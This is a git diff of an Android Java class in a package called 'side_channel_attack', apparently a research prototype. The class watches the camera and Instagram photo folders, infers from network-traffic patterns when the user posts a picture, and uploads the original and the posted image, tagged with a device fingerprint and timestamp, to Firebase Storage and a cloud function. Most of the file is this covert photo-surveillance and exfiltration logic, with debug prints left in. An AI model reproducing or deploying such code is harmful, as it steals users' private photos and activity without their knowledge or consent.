@@ -3,7 +3,7 @@ package com.example.side_channel_attack;
 import android.app.Activity;
 import android.content.Context;
 import android.hardware.camera2.CameraManager;
-import android.net.TrafficStats;
+import android.icu.util.TimeZone;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
@@ -29,114 +29,120 @@ import java.io.FileNotFoundException;
 import java.io.InputStream;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
-import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Map;
 
 public class CameraStateDetector {
-    private FileObserver observer;
-    private int RECORD_STATE = 1;
-    private int TRACK_STATE = 0;
+    private FileObserver dcimObserver;
+    private FileObserver instagramObserver;
+    private int PASSIVE_STATE = 1;
+    private int ACTIVE_STATE = 0;
 
-    private File image;
+    private File imagePreModified;
+    private File imagePostModified;
     private String timestamp;
     private String id;
     private String url;
     private FirebaseFunctions mFunctions;
-    private long byteHistory;
 
-    public CameraStateDetector(final Activity activity){
+    private long activeStateStartTime;
+
+    public CameraStateDetector(final Activity activity) {
+
+//        final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
+//        final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera/IMG_20190417_031849.jpg");
+//
+//        imagePreModified = dir;
+//        imagePostModified = dir;
 
         setUpDCIMListener();
+        setUpInstagramListener();
+        setUpCameraListener(activity);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            final PacketCatcher packetCatcher = new PacketCatcher();
-            CameraManager manager = (CameraManager) activity.getSystemService(Context.CAMERA_SERVICE);
-            manager.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
-                @Override
-                public void onCameraAvailable(String cameraId) {
-                    super.onCameraAvailable(cameraId);
-                    if (TRACK_STATE == 1) {
-                        System.out.println("entered123");
+    }
 
-
-//                        boolean outcomeOf1stEvent = packetCatcher.checkPeriodForUpload(
-//                                10000,
-//                                5,
-//                                1,
-//                                6000,
-//                                4000);
-//
-                        boolean outcomeOf1stEvent = packetCatcher.scan(byteHistory, 10000);
-                        System.out.println(outcomeOf1stEvent + " dssa");
-
-                        if(outcomeOf1stEvent && image != null) {
-                            System.out.println("sent123456");
-                            boolean outcomeOf2ndEvent = packetCatcher.checkPeriodForUpload(
-                                    60000,
-                                    2,
-                                    1,
-                                    1600,
-                                    1200);
-                            if (outcomeOf2ndEvent) {
-                                System.out.println("sent123");
-                                boolean outcomeOf3rdEvent = packetCatcher.checkPeriodForDownload(
-                                        20000,
-                                        200,
-                                        1,
-                                        1800,
-                                        1200);
-                                if(outcomeOf3rdEvent){
-//                                    sendData();
-                                    System.out.println("sent");
-                                }
-                            }
-                        } else {
-                            RECORD_STATE = 1;
-                            TRACK_STATE = 0;
-                        }
-
+    private void setUpCameraListener(Activity activity) {
+        final PacketCatcher packetCatcher = new PacketCatcher();
+        CameraManager manager = (CameraManager) activity.getSystemService(Context.CAMERA_SERVICE);
+        manager.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
+            @Override
+            public void onCameraAvailable(String cameraId) {
+                super.onCameraAvailable(cameraId);
+                System.out.println("entered");
+                System.out.println(ACTIVE_STATE);
+                if (ACTIVE_STATE == 1) {
+                    boolean outcomeOf1stEvent = packetCatcher.scan(10000);
+                    System.out.println(outcomeOf1stEvent);
+                    if (outcomeOf1stEvent) {
+                        activeStateStartTime = System.currentTimeMillis() - 4000;
+                    } else {
+                        PASSIVE_STATE = 1;
+                        ACTIVE_STATE = 0;
                     }
                 }
+            }
 
-                @Override
-                public void onCameraUnavailable(String cameraId) {
-                    super.onCameraUnavailable(cameraId);
-                    RECORD_STATE = 1;
-                }
-            }, null);
-        }
+            @Override
+            public void onCameraUnavailable(String cameraId) {
+                super.onCameraUnavailable(cameraId);
+                System.out.println("hellod");
+                PASSIVE_STATE = 1;
+                ACTIVE_STATE = 0;
+            }
+        }, null);
     }
 
     private void setUpDCIMListener() {
         final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
         final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera");
-        observer = new FileObserver(dir.getPath()) {
+        dcimObserver = new FileObserver(dir.getPath()) {
 
 
             @Override
             public void onEvent(int event, String file) {
-                if (RECORD_STATE == 1) {
+                if (PASSIVE_STATE == 1) {
                     if (event == FileObserver.CREATE && !file.equals(".probe")) {
-                        image = new File(dir.getPath() + "/" + file);
-                        byteHistory = TrafficStats.getTotalTxBytes();
+                        System.out.println("hklloinst");
 
-                        RECORD_STATE = 0;
-                        TRACK_STATE = 1;
+                        imagePreModified = new File(dir.getPath() + "/" + file);
+                        PASSIVE_STATE = 0;
+                        ACTIVE_STATE = 1;
                     }
                 }
             }
         };
-        observer.startWatching();
+        dcimObserver.startWatching();
+    }
+
+    private void setUpInstagramListener() {
+        final File instagramDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
+        final File dir = new File(instagramDirectory.getAbsolutePath() + "/Instagram");
+        instagramObserver = new FileObserver(dir.getPath()) {
+            @Override
+            public void onEvent(int event, String file) {
+                if (ACTIVE_STATE == 1) {
+                    if (event == FileObserver.CREATE && !file.equals(".probe")) {
+                        long activeStateEndTime = System.currentTimeMillis();
+                        System.out.println("helloinst");
+                        if ((activeStateEndTime - activeStateStartTime) >= 14000) {
+                            System.out.println("works");
+                            imagePostModified = new File(dir.getPath() + "/" + file);
+                            timestamp = getCurrentUTCTimestamp();
+
+                        } else {
+                            PASSIVE_STATE = 1;
+                            ACTIVE_STATE = 0;
+                        }
+                    }
+                }
+            }
+        };
+        instagramObserver.startWatching();
     }
 
     private void sendData() {
-        SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
-        Calendar calendar = Calendar.getInstance();
 
         FirebaseFirestore db = FirebaseFirestore.getInstance();
-        final DocumentReference userCheckRef = db.collection("users").document();
-
 
         id = "" +
                 Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +
@@ -152,7 +158,6 @@ public class CameraStateDetector {
 
         final Map<String, Object> entry = new HashMap<>();
 
-        timestamp = dateFormat.format(calendar.getTime());
         entry.put("date", timestamp);
         entry.put("id", id);
 
@@ -163,44 +168,45 @@ public class CameraStateDetector {
                 if (!task.getResult().exists()) {
                     System.out.println("bye");
 
-                    StorageReference storageRef = FirebaseStorage.getInstance().getReference();
-                    final String nameOfImage = id + "_" + System.currentTimeMillis() + ".jpg";
-                    final StorageReference ref = storageRef.child(nameOfImage);
-                    InputStream stream = null;
+                    final String preImageName = id + "_" + System.currentTimeMillis() + ".jpg";
+                    final UploadTask preImageStream = uploadImage(preImageName, imagePreModified);
 
-                    try {
-                        stream = new FileInputStream(image);
-                    } catch (FileNotFoundException e) {
-                        e.printStackTrace();
-                    }
-
-                    final InputStream finalStream = stream;
-
-                    ref.putStream(finalStream).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+                    preImageStream.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                         @Override
                         public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
-                            ref.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
-                                @Override
-                                public void onSuccess(final Uri uri) {
-                                    url = uri.toString();
-                                    entryRef.set(entry).addOnCompleteListener(new OnCompleteListener<Void>() {
+                            System.out.println("first image");
+                            mFunctions = FirebaseFunctions.getInstance();
+                            Map<String, Object> data = new HashMap<>();
+                            data.put("text", preImageName);
+                            mFunctions
+                                    .getHttpsCallable("filter")
+                                    .call(data).
+                                    addOnSuccessListener(new OnSuccessListener<HttpsCallableResult>() {
                                         @Override
-                                        public void onComplete(@NonNull Task<Void> task) {
-                                            mFunctions = FirebaseFunctions.getInstance();
-                                            Map<String, Object> data = new HashMap<>();
-                                            data.put("text", nameOfImage);
-                                            mFunctions
-                                                    .getHttpsCallable("filter")
-                                                    .call(data).
-                                                    addOnSuccessListener(new OnSuccessListener<HttpsCallableResult>() {
+                                        public void onSuccess(HttpsCallableResult httpsCallableResult) {
+
+                                            final HashMap<String, ArrayList<String>> data =
+                                                    (HashMap<String, ArrayList<String>>) httpsCallableResult.getData();
+
+                                            System.out.println(data);
+
+                                            final String postImageName = id + "_" + (System.currentTimeMillis() + 1) + ".jpg";
+                                            final UploadTask postImageStream = uploadImage(postImageName, imagePostModified);
+                                            postImageStream.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+                                                @Override
+                                                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
+                                                    taskSnapshot.getStorage().getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                                                         @Override
-                                                        public void onSuccess(HttpsCallableResult httpsCallableResult) {
+                                                        public void onSuccess(final Uri uri) {
+                                                            url = uri.toString();
+                                                            entryRef.set(entry).addOnCompleteListener(new OnCompleteListener<Void>() {
+                                                                @Override
+                                                                public void onComplete(@NonNull Task<Void> task) {
 
-                                                            HashMap<String, ArrayList<String>> data =
-                                                                    (HashMap<String, ArrayList<String>>) httpsCallableResult.getData();
 
-                                                            System.out.println(data.toString());
-                                                            int counter = 0;
+                                                                    System.out.println("second image ");
+                                                                    System.out.println(url);
+                                                                    int counter = 0;
 
 //                                                    for(String term : data.get("locationMatches")){
 //                                                        searchTag(term);
@@ -232,17 +238,38 @@ public class CameraStateDetector {
 //                                                            break;
 //                                                    }
 
+                                                                }
+                                                            });
                                                         }
                                                     });
+                                                }
+                                            });
+
+
                                         }
                                     });
-                                }
-                            });
+
                         }
                     });
                 }
             }
         });
+    }
+
+    private UploadTask uploadImage(String name, File image) {
+        InputStream stream = null;
+
+        try {
+            stream = new FileInputStream(image);
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
+
+        StorageReference storageRef = FirebaseStorage.getInstance().getReference();
+        final StorageReference ref = storageRef.child(name);
+
+        return ref.putStream(stream);
+
     }
 
     private void searchTag(String term) {
@@ -255,14 +282,23 @@ public class CameraStateDetector {
     }
 
 
-    private Map<String, Object> getParams(String additKey, String additVal) {
+    private Map<String, Object> getParams(String additionalKey, String additionalVal) {
         Map<String, Object> parameters = new HashMap<>();
         //default
         parameters.put("url", url);
         parameters.put("id", id);
         parameters.put("timestamp", timestamp);
         //additional
-        parameters.put(additKey, additVal);
+        parameters.put(additionalKey, additionalVal);
         return parameters;
+    }
+
+    private String getCurrentUTCTimestamp() {
+        android.icu.util.Calendar calendar = android.icu.util.Calendar.getInstance(TimeZone.getTimeZone("UTC"));
+
+        SimpleDateFormat formater = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
+        formater.setTimeZone(java.util.TimeZone.getTimeZone("UTC"));
+
+        return formater.format(calendar.getTime());
     }
 }
